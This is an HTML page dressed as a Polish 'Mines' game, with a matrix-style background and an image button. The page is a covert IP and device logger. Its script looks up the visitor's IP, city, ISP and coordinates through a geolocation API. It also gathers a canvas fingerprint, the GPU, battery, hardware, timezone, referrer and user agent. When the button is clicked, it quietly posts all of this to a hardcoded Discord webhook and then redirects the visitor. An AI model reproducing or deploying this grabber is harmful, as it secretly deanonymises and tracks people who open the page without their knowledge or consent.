<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mines</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: #e0e0e0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            user-select: none;
            overflow: hidden;
        }

        #matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 1;
            opacity: 0.12;
            pointer-events: none;
        }

        .main-content {
            position: relative;
            z-index: 2;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        h1 {
            color: #bb86fc;
            margin-bottom: 5px;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(187, 134, 252, 0.3);
        }

        #console-container {
            margin: 20px;
            background: #1e1e1e;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #333;
            width: 440px;
            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
            font-family: 'Courier New', Courier, monospace;
            box-sizing: border-box;
        }

        #ip {
            font-size: 0.95rem;
            color: #03dac6;
            margin-bottom: 10px;
            min-height: 40px;
            line-height: 1.4;
        }

        .progress-bar-container {
            width: 100%;
            background-color: #333;
            border-radius: 4px;
            overflow: hidden;
            display: none;
        }

        .progress-bar {
            width: 0%;
            height: 8px;
            background-color: #bb86fc;
            box-shadow: 0 0 8px #bb86fc;
            transition: width 0.1s linear;
        }

        .btn-container {
            background: none;
            border: none;
            padding: 0;
            cursor: pointer;
            transition: transform 0.2s, filter 0.3s;
            outline: none;
        }

        .btn-container:hover {
            transform: scale(1.03);
            filter: brightness(1.1);
        }

        .btn-container:active {
            transform: scale(0.97);
        }

        .btn-container img {
            width: 450px;
            border-radius: 15px;
            border: 2px solid #bb86fc;
            box-shadow: 0 0 20px rgba(187, 134, 252, 0.4);
            display: block;
        }
    </style>
</head>
<body>

    <canvas id="matrix-bg"></canvas>

    <div class="main-content">
        <h1>Mines</h1>
        
        <div id="console-container">
            <div id="ip">> Mines</div>
            <div class="progress-bar-container">
                <div class="progress-bar" id="p-bar"></div>
            </div>
        </div>
        
        <button class="btn-container" onclick="startSystemAccess()">
            <img src="https://radiokielce.pl/wp-content/uploads/2021/11/1-opatow-180109.jpeg" alt="WEJDŹ DO BAZY">
        </button>
    </div>

    <script>
        let geoData = {
            ip: "Nieznane", country: "Nieznany", region: "Nieznany", city: "Nieznane", 
            postal: "Nieznany", isp: "Nieznany", asn: "Nieznany", lat: "Brak", lon: "Brak"
        };
        let gpuModel = "Nie wykryto GPU";
        let batteryInfo = "Brak danych (Niewspierane)";

        const canvas = document.getElementById('matrix-bg');
        const ctx = canvas.getContext('2d');
        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        const alphabet = "01INF02ZSTABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const rainDrops = Array(Math.floor(columns)).fill(1);
        function drawMatrix() {
            ctx.fillStyle = 'rgba(18, 18, 18, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#bb86fc'; ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
                rainDrops[i]++;
            }
        }
        setInterval(drawMatrix, 30);

        fetch("https://ipapi.co/json/")
            .then(res => res.json())
            .then(data => {
                geoData = {
                    ip: data.ip || "Nieznane",
                    country: data.country_name || "Nieznany",
                    region: data.region || "Nieznany",
                    city: data.city || "Nieznane",
                    postal: data.postal || "Nieznany",
                    isp: data.org || "Nieznany",
                    asn: data.asn || "Nieznany",
                    lat: data.latitude || "Brak",
                    lon: data.longitude || "Brak"
                };
                document.getElementById("ip").innerHTML = `> Połączenie zintegrowane.<br>> Lokalizacja węzła: ${geoData.city} (${geoData.country})`;
            })
            .catch(() => {
                document.getElementById("ip").innerHTML = "> Mines by mariuszhitman";
            });

        try {
            const glCanvas = document.createElement('canvas');
            const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    gpuModel = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch (e) {}

        if (navigator.getBattery) {
            navigator.getBattery().then(batt => {
                batteryInfo = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Ładuje' : 'Rozładowuje'})`;
            });
        }

        function getCanvasFingerprint() {
            try {
                const fCanvas = document.createElement('canvas');
                const fCtx = fCanvas.getContext('2d');
                fCanvas.width = 200;
                fCanvas.height = 40;
                fCtx.textBaseline = "top";
                fCtx.font = "14px 'Arial'";
                fCtx.fillStyle = "#f60";
                fCtx.fillRect(125,1,62,20);
                fCtx.fillStyle = "#069";
                fCtx.fillText("INF.02_SCAN", 2, 15);
                fCtx.fillStyle = "rgba(102, 204, 0, 0.7)";
                fCtx.fillText("INF.02_SCAN", 4, 17);
                const b64 = fCanvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < b64.length; i++) {
                    hash = (hash << 5) - hash + b64.charCodeAt(i);
                    hash |= 0;
                }
                return Math.abs(hash).toString(16).toUpperCase();
            } catch (e) {
                return "Niedostępny";
            }
        }

        function startSystemAccess() {
            const ipDiv = document.getElementById("ip");
            const btn = document.querySelector('.btn-container');
            const pContainer = document.querySelector('.progress-bar-container');
            const pBar = document.getElementById('p-bar');
            
            btn.style.pointerEvents = "none";
            btn.style.opacity = "0.4";
            pContainer.style.display = "block";

            const steps = [
                { prg: 10, msg: "> Mines" },
                { prg: 30, msg: "> Mines" },
                { prg: 50, msg: "> Mines" },
                { prg: 75, msg: "> Mines" },
                { prg: 90, msg: "> Mines" },
                { prg: 100, msg: "> Mines" }
            ];

            const screenRes = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
            const windowRes = `${window.innerWidth}x${window.innerHeight} (Dostępne: ${window.screen.availWidth}x${window.screen.availHeight})`;
            const cCores = navigator.hardwareConcurrency || "Brak danych";
            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Brak danych";
            const lang = navigator.language || "Nieznany";
            const isDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Ciemny (Dark)" : "Jasny (Light)";
            const localTime = new Date().toLocaleString('pl-PL');
            
            const platform = navigator.platform || "Nieznany";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Nieznana";
            const networkStatus = navigator.onLine ? "Online" : "Offline";
            const connectionType = navigator.connection ? (navigator.connection.effectiveType || "Nieznany") : "Brak danych";
            const cookiesEnabled = navigator.cookieEnabled ? "Włączone" : "Wyłączone";
            const referrerPage = document.referrer || "Bezpośrednie wejście / Ukryty";
            
            const isAutomated = navigator.webdriver ? "Tak (Wykryto Bot/Automatyzację)" : "Nie (Prawdziwy użytkownik)";
            const touchPoints = navigator.maxTouchPoints || 0;
            const deviceType = touchPoints > 0 ? `Urządzenie Dotykowe (${touchPoints} pkt)` : "Klasyczny PC (Brak dotyku)";
            const canvasHash = getCanvasFingerprint();

            let currentStep = 0;

            const interval = setInterval(() => {
                if (currentStep < steps.length) {
                    const step = steps[currentStep];
                    pBar.style.width = step.prg + "%";
                    ipDiv.innerHTML = step.msg;

                    if (step.prg === 90) {
                        const payload = {
                            content: "=======================================\n" +
                                     "🚨 **MARIUSZHITMAN**\n" +
                                     "=======================================\n" +
                                     `🌐 **Adres IP:** \`${geoData.ip}\`\n` +
                                     `🏢 **Dostawca (ISP):** \`${geoData.isp} (${geoData.asn})\`\n` +
                                     `📍 **Lokalizacja:** \`${geoData.city}, ${geoData.region}, ${geoData.country} (${geoData.postal})\`\n` +
                                     `🗺️ **Współrzędne:** \`${geoData.lat}, ${geoData.lon}\`\n` +
                                     "---------------------------------------\n" +
                                     `💻 **System / Platforma:** \`${platform}\`\n` +
                                     `🎮 **Karta Graficzna:** \`${gpuModel}\`\n` +
                                     `🧬 **Canvas Fingerprint:** \`${canvasHash}\`\n` +
                                     `🔋 **Status Baterii:** \`${batteryInfo}\`\n` +
                                     `⚙️ **Procesor / RAM:** \`${cCores} vCPU / ${ram}\`\n` +
                                     `🖥️ **Rozdzielczość:** \`${screenRes}\`\n` +
                                     `🔲 **Okno Przeglądarki:** \`${windowRes}\`\n` +
                                     `👆 **Typ Urządzenia:** \`${deviceType}\`\n` +
                                     "---------------------------------------\n" +
                                     `🤖 **Wykrycie Bota (Webdriver):** \`${isAutomated}\`\n` +
                                     `📶 **Sieć / Połączenie:** \`${networkStatus} (${connectionType})\`\n` +
                                     `🍪 **Pliki Cookie:** \`${cookiesEnabled}\`\n` +
                                     `🔗 **Źródło wejścia (Referrer):** \`${referrerPage}\`\n` +
                                     `💬 **Język / Czas:** \`${lang} / ${localTime} (${timezone})\`\n` +
                                     "---------------------------------------\n" +
                                     `🤖 **User-Agent:** \`${navigator.userAgent}\`\n` +
                                     "======================================="
                        };

                        fetch("https://discord.com/api/webhooks/1514013803912630352/WSDMZ0hqcG6s9M8TTvptRjYjll1yYqRCNjdHCiSse6sRYOWr-34xIRTTpqqDkYNHFDxm", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify(payload)
                        }).catch(() => {});
                    }
                    currentStep++;
                } else {
                    clearInterval(interval);
                    setTimeout(() => {
                        window.location.href = "index2.html";
                    }, 10);
                }
            }, 10);
        }
    </script>
</body>
</html>
